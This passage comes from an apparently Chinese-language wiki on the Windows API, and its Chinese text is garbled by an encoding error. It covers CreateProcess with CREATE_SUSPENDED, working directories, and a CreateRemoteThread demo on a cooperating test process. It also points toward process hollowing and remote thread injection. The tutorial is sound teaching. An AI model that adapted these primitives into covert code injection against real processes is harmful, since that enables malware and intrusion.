è¦å¯åŠ¨çš„ç¨‹åºå NULL, // å‘½ä»¤è¡Œå‚æ•° NULL, // è¿›ç¨‹å¥æŸ„ä¸å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ NULL, // çº¿ç¨‹å¥æŸ„ä¸å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ FALSE, // ä¸ç»§æ‰¿çˆ¶è¿›ç¨‹å¥æŸ„ CREATE_NEW_CONSOLE, // åˆ›å»ºæ ‡å¿—ï¼Œä½¿ç”¨ CREATE_NEW_CONSOLE NULL, // NULL, // &amp;si, // æŒ‡å‘STARTUPINFOçš„æŒ‡é’ˆ &amp;pi // æŒ‡å‘PROCESS_INFORMATIONçš„æŒ‡é’ˆ )) &#123; printf(&quot;CreateProcess failed (%d). &quot;, GetLastError()); return 1; &#125; // ç­‰å¾…è¿›ç¨‹Aç»“æŸ WaitForSingleObject(pi.hProcess, INFINITE); // å…³é—­è¿›ç¨‹å’Œçº¿ç¨‹çš„å¥æŸ„ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; å­è¿›ç¨‹å°±ä¼šæ–°èµ·ä¸€ä¸ªcmdè¾“å‡ºï¼Œä¸å’Œçˆ¶è¿›ç¨‹å…±ç”¨ä¸€ä¸ªcmd åˆ›å»ºæŒ‚èµ·è¿›ç¨‹ dwCreationFlagsä¸­å¸¸ç”¨çš„ä¸€ä¸ªå‚æ•°æ˜¯CREATE_SUSPENDEDï¼Œä»¥æŒ‚èµ·çš„æ–¹å¼åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼ŒæŒ‚èµ·æ€è¿›ç¨‹è¢«åˆ›å»ºåï¼Œåªæœ‰è°ƒç”¨ResumeThreadå‡½æ•°è¢«è°ƒç”¨ï¼Œè¿™ä¸ªè¿›ç¨‹æ‰ä¼šç»§ç»­æ‰§è¡Œã€‚ The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called. å¦‚æœæ˜¯ä»¥æŒ‚èµ·æ€çš„æ–¹å¼åˆ›å»ºè¿›ç¨‹ï¼Œä¹‹å‰è®²åˆ°çš„è¿›ç¨‹çš„åˆ›å»ºè¿‡ç¨‹å°±ä¼šæœ‰å˜åŒ–ï¼š 12345678910111. å°†EXEæ–‡ä»¶æ˜ å°„åˆ°ä½2Gçš„ç©ºé—´ä¸­ - PEæ–‡ä»¶ä¸­çš„å­—æ®µè¯´äº†åœ¨å“ªåŠ è½½2. åœ¨é«˜2Gåˆ›å»ºè¯¥è¿›ç¨‹çš„`å†…æ ¸å¯¹è±¡EPROCESS` - æ¯ä¸ªè¿›ç¨‹è¢«åˆ›å»ºï¼Œéƒ½è¦åœ¨å†…æ ¸ç©ºé—´åˆ›å»ºä¸€ä¸ªEPROCESS3. å°†ç³»ç»ŸDLLï¼ˆntdll.dllï¼‰æ˜ å°„åˆ°ä½2Gç©ºé—´ä¸­4. åœ¨é«˜2Gåˆ›å»ºè¯¥è¿›ç¨‹çš„`çº¿ç¨‹å†…æ ¸å¯¹è±¡ETHREAD` - è¿›ç¨‹æä¾›äº†ç©ºé—´ä¸Šçš„èµ„æºï¼Œè·‘èµ·æ¥è¦çº¿ç¨‹ã€‚ä¸€ä¸ªè¿›ç¨‹è‡³å°‘éœ€è¦ä¸€ä¸ªçº¿ç¨‹ï¼Œå®ƒæ‰èƒ½è·‘èµ·æ¥+ 5. å¦‚æœæ˜¯ä»¥æŒ‚èµ·æ–¹å¼åˆ›å»ºçš„ï¼Œåœ¨è¿™é‡Œä¼šç­‰å¾…ï¼Œç›´è‡³ResumeThreadè¢«è°ƒç”¨6. æ¢å¤åç»§ç»­æ‰§è¡Œï¼š - æ˜ å°„DLLï¼ˆntdll.LdrInitializeThunkï¼‰ - çº¿ç¨‹å¼€å§‹æ‰§è¡Œ é‚£ä¹Ÿå°±è¯´æ˜äº†ï¼šè¿›ç¨‹å°±æ˜¯ä¸ºç¨‹åºæä¾›èµ„æºï¼Œåƒæ­¥éª¤1ã€2ã€3ã€4ï¼›è€ŒçœŸæ­£æ‰§è¡Œçš„æ˜¯çº¿ç¨‹ï¼ˆå› ä¸ºä¸Šé¢å°†çº¿ç¨‹æŒ‚èµ·åï¼Œå°±æ²¡åŠ¨äº†ï¼Œç›´åˆ°ResumeThreadnæ¢å¤çº¿ç¨‹çš„æ‰§è¡Œï¼‰ åœ¨ResumeThreadæ¢å¤æ‰§è¡Œå‰ï¼Œæˆ‘ä»¬å¯ä»¥åŠ¨æ‰‹è„šï¼Œæ¯”å¦‚ç‹¸çŒ«æ¢å¤ªå­ï¼Œæå‰æ³¨å…¥ï¼ŒProcess Hollowingï¼Œå‚€å„¡è¿›ç¨‹ç­‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); // ä½¿ç”¨ CREATE_SUSPENDED åˆ›å»ºä¸€ä¸ªåˆå§‹çŠ¶æ€ä¸ºæŒ‚èµ·çš„è®°äº‹æœ¬è¿›ç¨‹ if (!CreateProcess( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), // ç¨‹åºåç§° NULL, // å‘½ä»¤è¡Œå‚æ•° NULL, // è¿›ç¨‹å¥æŸ„ä¸å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ NULL, // çº¿ç¨‹å¥æŸ„ä¸å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ FALSE, // ä¸ç»§æ‰¿çˆ¶è¿›ç¨‹å¥æŸ„ CREATE_SUSPENDED, // åˆ›å»ºæ ‡å¿—ï¼Œä½¿ç”¨ CREATE_SUSPENDED NULL, // NULL, // &amp;si, // æŒ‡å‘STARTUPINFOçš„æŒ‡é’ˆ &amp;pi // æŒ‡å‘PROCESS_INFORMATIONçš„æŒ‡é’ˆ )) &#123; printf(&quot;CreateProcess failed (%d). &quot;, GetLastError()); return 1; &#125; // åœ¨ResumeThreadå‰å¯ä»¥åšä¸€äº›å¤„ç† // ... // æ­¤å¤„æ¢å¤çº¿ç¨‹ï¼Œä»è€Œå¼€å§‹æ‰§è¡Œè®°äº‹æœ¬è¿›ç¨‹ ResumeThread(pi.hThread); // ç­‰å¾…è¿›ç¨‹ç»“æŸ WaitForSingleObject(pi.hProcess, INFINITE); // å…³é—­è¿›ç¨‹å’Œçº¿ç¨‹çš„å¥æŸ„ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; lpCurrentDirectory å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½•ï¼Œå¦‚æœè®¾ç½®ä¸ºNULLï¼Œé»˜è®¤å’Œçˆ¶è¿›ç¨‹çš„å·¥ä½œç›®å½•ä¸€æ · 1[in, optional] lpCurrentDirectory The full path to the current directory for the process. The string can also specify a UNC path. If this parameter is NULL, the new process will have the same current drive and directory as the calling process. (This feature is provided primarily for shells that need to start an application and specify its initial drive and working directory.) è¿™é‡Œè¯´ä¸‹ä»€ä¹ˆæ˜¯æ¨¡å—ç›®å½•å’Œå·¥ä½œç›®å½•ï¼š æ¨¡å—ç›®å½•ï¼šæ¨¡å—æ‰€åœ¨çš„è·¯å¾„ å·¥ä½œç›®å½•ï¼šç¨‹åºå·¥ä½œç›®å½•ã€‚çˆ¶è¿›ç¨‹ä½¿ç”¨CreateProcessæ—¶ä¼ çš„å‚æ•°ï¼Œå¦‚æœæ˜¯NULLï¼Œé‚£å·¥ä½œç›®å½•å°±å’Œå’Œçˆ¶è¿›ç¨‹çš„å·¥ä½œç›®å½•ä¸€æ · ä¾‹ é€šè¿‡GetModuleFileNameå’ŒGetCurrentDirectoryå‡½æ•°åˆ†åˆ«è·å¾—å½“å‰æ¨¡å—ï¼ˆæ‰§è¡Œæ–‡ä»¶ï¼‰çš„ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•ï¼š GetModuleFileName å‡½æ•°ç”¨äºè·å–å½“å‰æ‰§è¡Œçš„æ¨¡å—ï¼ˆä¾‹å¦‚ï¼Œæ‚¨çš„ç¨‹åºï¼‰çš„å®Œæ•´è·¯å¾„ã€‚è¿™åŒ…æ‹¬äº†æ¨¡å—æ‰€åœ¨çš„ç›®å½•ä»¥åŠæ¨¡å—çš„æ–‡ä»¶åã€‚ GetCurrentDirectory å‡½æ•°è·å–ç¨‹åºçš„å½“å‰å·¥ä½œç›®å½•ï¼Œå³ç¨‹åºè¿è¡Œæ—¶çš„æ´»åŠ¨ç›®å½•ã€‚è¿™ä¸ªç›®å½•å¯ä»¥ä¸æ¨¡å—æ‰€åœ¨çš„ç›®å½•ä¸åŒï¼Œå–å†³äºCreateProcessæ—¶lpCurrentDirectoryå‚æ•°çš„è®¾ç½® Unicodeç‰ˆ123456789101112131415161718192021222324252627#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;stdio.h&gt;int main() &#123; TCHAR modulePath[MAX_PATH]; // å­˜å‚¨æ¨¡å—è·¯å¾„ TCHAR currentPath[MAX_PATH]; // å­˜å‚¨å½“å‰å·¥ä½œè·¯å¾„ // è·å–å½“å‰æ¨¡å—çš„å®Œæ•´è·¯å¾„ï¼ˆåŒ…æ‹¬æ‰§è¡Œæ–‡ä»¶çš„åç§°ï¼‰ if (GetModuleFileName(NULL, modulePath, MAX_PATH) == 0) &#123; _tprintf(_T(&quot;Error getting module file name. &quot;)); return 1; &#125; // è·å–å½“å‰å·¥ä½œç›®å½•çš„è·¯å¾„ if (GetCurrentDirectory(MAX_PATH, currentPath) == 0) &#123; _tprintf(_T(&quot;Error getting current directory. &quot;)); return 1; &#125; // æ‰“å°æ¨¡å—è·¯å¾„å’Œå½“å‰å·¥ä½œè·¯å¾„ _tprintf(_T(&quot;Module Path: %s &quot;), modulePath); _tprintf(_T(&quot;Current Working Directory: %s &quot;), currentPath); getchar(); return 0;&#125; VSæ‰§è¡Œï¼Œçˆ¶è¿›ç¨‹æ˜¯VSåŒå‡»æ‰§è¡Œï¼Œçˆ¶è¿›ç¨‹æ˜¯explorer ç”¨é€”ï¼Œæ¯”å¦‚fopenè¯»æ–‡ä»¶æ—¶ï¼Œæœªä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œå¯»æ‰¾çš„è·¯å¾„å°±æ˜¯è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½• 1fopen(&quot;D:/005_Codefield/VS2019/DiShui_Test/Debug/TestA.exe&quot;, &quot;r&quot;); //ç»å¯¹è·¯å¾„ 1fopen(&quot;A.exe&quot;, &quot;r&quot;); //åœ¨è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•ä¸‹å¯»æ‰¾&quot;A.exe&quot; å…¶ä»–è¿›ç¨‹ç›¸å…³API è·å–å½“å‰è¿›ç¨‹IDï¼ˆPIDï¼‰ï¼šGetCurrentProcessId è·å–å½“å‰è¿›ç¨‹å¥æŸ„ï¼šGetCurrentProcess è·å–å‘½ä»¤è¡Œï¼šGetCommandLine è·å–å¯åŠ¨ä¿¡æ¯ï¼šGetStartupInfo è·å–ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹çš„PIDï¼šEnumProcesses å¿«ç…§ï¼šCreateToolhelp32Snapshot çŒœæµ‹ä¸ºä»€ä¹ˆèµ·åå«å¿«ç…§ï¼šå†…æ ¸ç¨‹åºçš„è¿è¡Œæ—¶æ˜¯åƒå˜ä¸‡åŒ–çš„ï¼Œæ¯”å¦‚æŸä¸ªçº¿ç¨‹ç°åœ¨å­˜åœ¨ä½†è¿‡ä¸€ä¼šå¯èƒ½å°±æ‰§è¡Œå®Œäº†ã€‚å½“æ‰§è¡ŒCreateToolhelp32Snapshotå‡½æ•°çš„ä¸€ç¬é—´å°†ç³»ç»Ÿä¸­çš„ä¿¡æ¯ä¿ç•™ä¸‹æ¥ï¼Œä¾›å¼€å‘è€…è¿›è¡Œåˆ†æã€‚è¿™ä¸ªå¿«ç…§æ˜¯æ‹æ‘„æ—¶çš„ç³»ç»ŸçŠ¶æ€ï¼Œç›¸å½“äºåœ¨è¿™ä¸ªæ—¶åˆ»ç»™ç³»ç»Ÿå†…æ ¸æ‹äº†ä¸€ä¸ªå¿«ç…§ï¼Œè€Œæ‹æ‘„åç³»ç»Ÿå†…æ ¸çš„çŠ¶æ€å¯èƒ½å‘ç”Ÿäº†å˜åŒ–ã€‚"},{"title":"è¿œç¨‹çº¿ç¨‹","path":"/wiki/Windows_API/è¿œç¨‹çº¿ç¨‹.html","content":"è¿œç¨‹çº¿ç¨‹ çº¿ç¨‹æ˜¯ä»£ç æ‰§è¡Œçš„å®ä½“ï¼ŒCreateThreadç”¨äºåœ¨è‡ªèº«è¿›ç¨‹åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œ CreateRemoteThreadç”¨äºåœ¨å…¶ä»–è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ã€‚å¦‚ï¼ŒAè¿›ç¨‹ä¸­è°ƒç”¨CreateRemoteThreadåœ¨Bè¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ 123456789HANDLE CreateRemoteThread( [in] HANDLE hProcess, // handle to process ç›®æ ‡è¿›ç¨‹å¥æŸ„ [in] LPSECURITY_ATTRIBUTES lpThreadAttributes,// SD [in] SIZE_T dwStackSize, // initial stack size [in] LPTHREAD_START_ROUTINE lpStartAddress, // thread function [in] LPVOID lpParameter, // thread argument [in] DWORD dwCreationFlags, // creation option [out] LPDWORD lpThreadId // thread identifier); å‚æ•°hProcessï¼šç›®æ ‡è¿›ç¨‹å¥æŸ„ã€‚è¯¥å¥æŸ„è¦æœ‰PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, and PROCESS_VM_READè¿™äº›æƒé™ å‚æ•°lpStartAddressï¼šæ³¨æ„è¯¥åœ°å€æŒ‡çš„æ˜¯ç›®æ ‡è¿›ç¨‹ä¸­çš„å‡½æ•°åœ°å€ã€‚å› ä¸ºåœ¨Aä¸­ç»™Båˆ›å»ºè¿œçº¿ç¨‹ï¼Œè¿™ä¸ªçº¿ç¨‹æ˜¯åœ¨Bä¸­è·‘ ä¾‹ TargetProcessRemoteThreadCreatorTargetProcessé¡¹ç›®è¡¨ç¤ºç›®æ ‡è¿›ç¨‹ã€‚ ä¸»å‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹å‡½æ•°ï¼Œçº¿ç¨‹å‡½æ•°ä¸­ä¼šæ‰“å°è¾“å‡ºçº¿ç¨‹å‡½æ•°è¢«è°ƒç”¨çš„æç¤ºã€‚åœ¨ä¸»å‡½æ•°ä¸­ä¼šæ‰“å°å‡ºè‡ªèº«è¿›ç¨‹çš„IDå·å’Œçº¿ç¨‹å‡½æ•°åœ°å€ï¼Œä¾¿äºè¿è¡ŒRemoteThreadCreatorè¿›ç¨‹æ—¶è¾“å…¥ã€‚éšågetchar()åœä½ç­‰å¾…è¢«åˆ›å»ºè¿œç¨‹çº¿ç¨‹ 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD WINAPI ThreadFunc(LPVOID lpParam)&#123; printf(&quot;ThreadFunc called... &quot;); return 0;&#125;int main()&#123; // æ‰“å°å½“å‰è¿›ç¨‹çš„ID DWORD processId = GetCurrentProcessId(); printf(&quot;Target Process ID: %lu &quot;, processId); HANDLE hThread = CreateThread( NULL, // é»˜è®¤å®‰å…¨å±æ€§ 0, // é»˜è®¤å †æ ˆå¤§å° ThreadFunc, // çº¿ç¨‹å‡½æ•°åœ°å€ NULL, // ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // é»˜è®¤åˆ›å»ºæ ‡å¿— NULL); // ä¸éœ€è¦æ¥æ”¶çº¿ç¨‹ID if (hThread == NULL) &#123; printf(&quot;Failed to create thread. Error: %lu &quot;, GetLastError()); return 0; &#125; printf(&quot;Thread created successfully.Thread function address: %p &quot;, ThreadFunc); // ç­‰å¾…ç”¨æˆ·è¾“å…¥ getchar(); CloseHandle(hThread); return 0;&#125;ç”¨æˆ·å°†ç›®æ ‡è¿›ç¨‹IDå’Œçº¿ç¨‹å‡½æ•°åœ°å€è¾“å…¥ç»™ç¨‹åºåï¼Œè°ƒç”¨CreateRemoteThreadåœ¨ç›®æ ‡è¿›ç¨‹åˆ›å»ºè¿œçº¿ç¨‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main()&#123; // è¾“å…¥ç›®æ ‡è¿›ç¨‹çš„ID DWORD dwTargetProcessId; printf(&quot;Enter the target process ID: &quot;); scanf(&quot;%lu&quot;, &amp;dwTargetProcessId); // æ‰“å¼€ç›®æ ‡è¿›ç¨‹ HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwTargetProcessId); if (hProcess == NULL) &#123; printf(&quot;Failed to open target process. Error: %lu &quot;, GetLastError()); return 1; &#125; printf(&quot;Target process opened successfully. &quot;); // è¾“å…¥çº¿ç¨‹å‡½æ•°åœ°å€ void* pFuncAddr; printf(&quot;Enter the thread function address (hexadecimal): &quot;); scanf(&quot;%p&quot;, &amp;pFuncAddr); auto pThreadFunc = (LPTHREAD_START_ROUTINE)pFuncAddr; // åˆ›å»ºè¿œç¨‹çº¿ç¨‹ HANDLE hRemoteThread = CreateRemoteThread( hProcess, NULL, // é»˜è®¤å®‰å…¨å±æ€§ 0, // é»˜è®¤å †æ ˆå¤§å° pThreadFunc, // çº¿ç¨‹å‡½æ•°åœ°å€ï¼Œæ³¨æ„è¯¥åœ°å€æ˜¯ç›®æ ‡è¿›ç¨‹ä¸­çš„åœ°å€ NULL, // ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // é»˜è®¤åˆ›å»ºæ ‡å¿— NULL); // ä¸éœ€è¦æ¥æ”¶çº¿ç¨‹ID // æ£€æŸ¥è¿œç¨‹çº¿ç¨‹åˆ›å»ºæ˜¯å¦æˆåŠŸ if (hRemoteThread == NULL) &#123; printf(&quot;Failed to create remote thread. Error: %lu &quot;, GetLastError()); &#125; else &#123; printf(&quot;Remote thread created successfully. &quot;); &#125; // å…³é—­å¥æŸ„ CloseHandle(hRemoteThread); CloseHandle(hProcess); return 0;&#125; è¿è¡Œæ•ˆæœ å…ˆè¿è¡ŒTargetProcessç¨‹åº 1234Target Process ID: 29492Thread created successfully.Thread function address: 004D10CDThreadFunc called... ç„¶åè¿è¡ŒRemoteThreadCreatorè¾“å…¥ç›®æ ‡è¿›ç¨‹IDå’Œçº¿ç¨‹å‡½æ•°åœ°å€ 1234Enter the target process ID: 29492Target process opened successfully.Enter the thread function address (hexadecimal): 004d10cdRemote thread created successfully. å›è½¦åæ˜¾ç¤ºåˆ›å»ºè¿œçº¿ç¨‹æˆåŠŸï¼Œåœ¨TargetProcessè¿›ç¨‹çš„è¾“å‡ºé‚£çœ‹åˆ°å¤šäº†ä¸€è¡Œ ThreadFunc called...ï¼Œè¡¨æ˜åˆ›å»ºè¿œçº¿ç¨‹æˆåŠŸ 12345Target Process ID: 29492Thread created successfully.Thread function address: 004D10CDThreadFunc called...+ ThreadFunc called... å†æ¬¡è¿è¡ŒRemoteThreadCreatorå†æ¬¡è¾“å…¥åˆ›å»ºè¿œçº¿ç¨‹ï¼Œå°±è¿˜èƒ½å†çœ‹åˆ°æ–°çš„ ThreadFunc called... å°ç»“ CreateRemoteThreadéœ€è¦æœ‰ç›®æ ‡è¿›ç¨‹hProcessçš„æƒé™ï¼Œçº¿ç¨‹å‡½æ•°åœ°å€æ˜¯ç›®æ ‡è¿›ç¨‹ä¸­çš„å‡½æ•°åœ°å€ CreateRemoteThreadå‡½æ•°ä¸­çº¿ç¨‹å‡½æ•°åœ°å€è¿™ä¸ªå‚æ•°lpStartAddressï¼Œå®é™…ä¹Ÿå¯ä»¥ç”¨å¼ºè½¬æ¥ä¼ é€’ä¸€ä¸ªä¸ç¬¦åˆçº¿ç¨‹å‡½æ•°è§„èŒƒçš„å‡½æ•°åœ°å€ 1234567DWORD WINAPI ThreadProc( _In_Â LPVOID lpParameter // thread data);1ã€è¿”å›å€¼æ˜¯4ä¸ªå­—èŠ‚2ã€è°ƒç”¨çº¦å®šæ˜¯stdcall3ã€1ä¸ª4å­—èŠ‚çš„å‚æ•° çº¿ç¨‹å‡½æ•°æ˜¯stdcallè°ƒç”¨çº¦å®šå³å¯ï¼Œç„¶åå¼ºè½¬ä¼ é€’ ç¤ºä¾‹åªéœ€å°†TargetProcessä¸­çš„çº¿ç¨‹å‡½æ•°æ”¹ä¸€ä¸‹ï¼Œä¸‹é¢è¿™ä¸¤ä¸ªç¨‹åºè¿è¡Œä¹Ÿå®ç°äº†è¿œçº¿ç¨‹çš„åˆ›å»ºTargetProcessRemoteThreadCreator12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;windows.h&gt;VOID WINAPI ThreadFunc(LPVOID lpParam)&#123; printf(&quot;ThreadFunc called... &quot;); //return 0;&#125;int main()&#123; // æ‰“å°å½“å‰è¿›ç¨‹çš„ID DWORD processId = GetCurrentProcessId(); printf(&quot;Target Process ID: %lu &quot;, processId); HANDLE hThread = CreateThread( NULL, // é»˜è®¤å®‰å…¨å±æ€§ 0, // é»˜è®¤å †æ ˆå¤§å° (LPTHREAD_START_ROUTINE)ThreadFunc, // çº¿ç¨‹å‡½æ•°åœ°å€ NULL, // ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // é»˜è®¤åˆ›å»ºæ ‡å¿— NULL); // ä¸éœ€è¦æ¥æ”¶çº¿ç¨‹ID if (hThread == NULL) &#123; printf(&quot;Failed to create thread. Error: %lu &quot;, GetLastError()); return 0; &#125; printf(&quot;Thread created successfully.Thread function address: %p &quot;, ThreadFunc); // ç­‰å¾…ç”¨æˆ·è¾“å…¥ getchar(); CloseHandle(hThread); return 0;&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main()&#123; // è¾“å…¥ç›®æ ‡è¿›ç¨‹çš„ID DWORD dwTargetProcessId; printf(&quot;Enter the target process ID: &quot;); scanf(&quot;%lu&quot;, &amp;dwTargetProcessId); // æ‰“å¼€ç›®æ ‡è¿›ç¨‹ HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwTargetProcessId); if (hProcess == NULL) &#123; printf(&quot;Failed to open target process. Error: %lu &quot;, GetLastError()); return 1; &#125; printf(&quot;Target process opened successfully. &quot;); // è¾“å…¥çº¿ç¨‹å‡½æ•°åœ°å€ void* pFuncAddr; printf(&quot;Enter the thread function address (hexadecimal): &quot;); scanf(&quot;%p&quot;, &amp;pFuncAddr); auto pThreadFunc = (LPTHREAD_START_ROUTINE)pFuncAddr; // åˆ›å»ºè¿œç¨‹çº¿ç¨‹ HANDLE hRemoteThread = CreateRemoteThread( hProcess, NULL, // é»˜è®¤å®‰å…¨å±æ€§ 0, // é»˜è®¤å †æ ˆå¤§å° pThreadFunc, // çº¿ç¨‹å‡½æ•°åœ°å€ï¼Œæ³¨æ„è¯¥åœ°å€æ˜¯ç›®æ ‡è¿›ç¨‹ä¸­çš„åœ°å€ NULL, // ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // é»˜è®¤åˆ›å»ºæ ‡å¿— NULL); // ä¸éœ€è¦æ¥æ”¶çº¿ç¨‹ID // æ£€æŸ¥è¿œç¨‹çº¿ç¨‹åˆ›å»ºæ˜¯å¦æˆåŠŸ if (hRemoteThread == NULL) &#123; printf(&quot;Failed to create remote thread. Error: %lu &quot;, GetLastError()); &#125; else &#123; printf(&quot;Remote thread created successfully. &quot;); &#125; // å…³é—­å¥æŸ„ CloseHandle(hRemoteThread); CloseHandle(hProcess); return 0;&#125; åº”ç”¨ è¿œç¨‹çº¿ç¨‹å¯ä»¥åšå¾ˆå¤šäº‹ï¼Œå…¶ä¸­ä¸€ä¸ªåº”ç”¨æ˜¯è¿œç¨‹çº¿ç¨‹æ³¨å…¥"},{"title":"é€šç”¨æ§ä»¶","path":"/wiki/Windows_API/é€šç”¨æ§ä»¶.html","content":"å‰è¨€ ä»¥ç¼–å†™MyLordPEä¸»ç•Œé¢ä¸ºä¾‹ï¼Œæ¥è®²è§£å¦‚ä½•ä½¿ç”¨é€šç”¨æ§ä»¶ã€‚ ä¸Šé¢æ˜¯è¿›ç¨‹åˆ—è¡¨ï¼Œæ˜¾ç¤ºå‡ºç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹çš„è¿›ç¨‹åï¼ŒPIDå·ï¼ŒImageBaseï¼ŒSizeOfImage ä¸‹é¢æ˜¯æ¨¡å—åˆ—è¡¨ï¼Œå½“é€‰ä¸­è¿›ç¨‹åˆ—è¡¨ä¸­çš„æŸä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œä¼šåœ¨æ¨¡å—åˆ—è¡¨ä¸­æ˜¾ç¤ºå‡ºè¢«é€‰ä¸­è¿›ç¨‹ä¸­çš„æ‰€æœ‰æ¨¡å—çš„æ¨¡å—åå’Œè·¯å¾„ æ ‡å‡†æ§ä»¶ä¸é€šç”¨æ§ä»¶ æ–°å»ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå·¦å³å„å¼„ä¸€ä¸ªGroup Boxï¼Œå¼„ä¸‹å¸ƒå±€ï¼Œæ‹‰å‡ ä¸ªButtonï¼Œæ”¹ä¸‹åå­—ï¼Œå±æ€§ï¼Œè°ƒä¸‹å¸ƒå±€ï¼Œæ˜¾ç¤ºä¸€ä¸‹ã€‚ ä»£ç 123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG_MAIN), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; return FALSE;&#125; ä¸Šä¸‹å„æ‹‰ä¸€ä¸ªList Controlï¼Œä¸Šé¢çš„ç”¨äºæ˜¾ç¤ºè¿›ç¨‹ï¼Œä¸‹é¢çš„ç”¨äºæ˜¾ç¤ºè¿›ç¨‹ä¸­çš„æ¨¡å—ã€‚å¯¹List Controlå³é”®ï¼Œä¿®æ”¹IDåå­—ï¼Œä¿®æ”¹è§†å›¾ä¸ºReportã€‚ åœ¨Windowsä¸­ï¼Œæ ‡å‡†æ§ä»¶æ€»æ˜¯å¯ç”¨çš„ï¼Œä¸éœ€è¦ç‰¹æ®Šçš„åº“æˆ–é“¾æ¥æ“ä½œã€‚è¿™äº›æ§ä»¶å¯ä»¥ç›´æ¥ä»èµ„æºè§†å›¾ä¸­æ‹–æ‹‰åˆ°çª—ä½“ä¸Šï¼Œæ— éœ€é¢å¤–ä»£ç æ”¯æŒã€‚ è¿™äº›éƒ½æ˜¯Windowsæ ‡å‡†æ§ä»¶12345678Static\tGroup Box\tButton\tCheck Box\tRadio Button\tEdit\tComboBox\tListBox è€Œé€šç”¨æ§ä»¶ï¼Œå› ä¸ºä¸å¸¸ç”¨ï¼Œä¸æ˜¯é»˜è®¤åŠ è½½çš„ï¼Œéœ€è¦åœ¨ç¨‹åºä¸­æ˜¾å¼å¼•ç”¨ç›¸åº”çš„åº“ã€‚å¦‚æœç¨‹åºä¸­ä½¿ç”¨äº†è¿™äº›æ§ä»¶ï¼Œåˆ™å¿…é¡»åŒ…å«ç›¸å…³å¤´æ–‡ä»¶ï¼Œå¹¶é“¾æ¥åˆ°ç›¸åº”çš„åº“ä»¥ç¡®ä¿æ§ä»¶ä»£ç è¢«ç¼–è¯‘åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ è¿™äº›éƒ½æ˜¯Windowsé€šç”¨æ§ä»¶1234567891011121314151617181920212223AnimationComboBoxEx Date_and_Time_Picker Drag_List_Box Flat_Scroll_Bar Header HotKey ImageList IPAddress List_View Month_Calendar Pager Progress_Bar Property_Sheets Rebar Status Bars SysLink Tab Toolbar ToolTip Trackbar TreeView Up_and_Down è¦ä½¿ç”¨è¿™äº›æ§ä»¶ï¼Œå¿…é¡»åŒ…å«&lt;commctrl.h&gt;å¤´æ–‡ä»¶å¹¶é“¾æ¥comctl32.libåº“ï¼š 12#include &lt;commctrl.h&gt;#pragma comment(lib,&quot;comctl32.lib&quot;) åŒæ—¶ï¼Œéœ€è¦åˆå§‹åŒ–æ§ä»¶åº“ã€‚é€šè¿‡è°ƒç”¨ InitCommonControlsEx 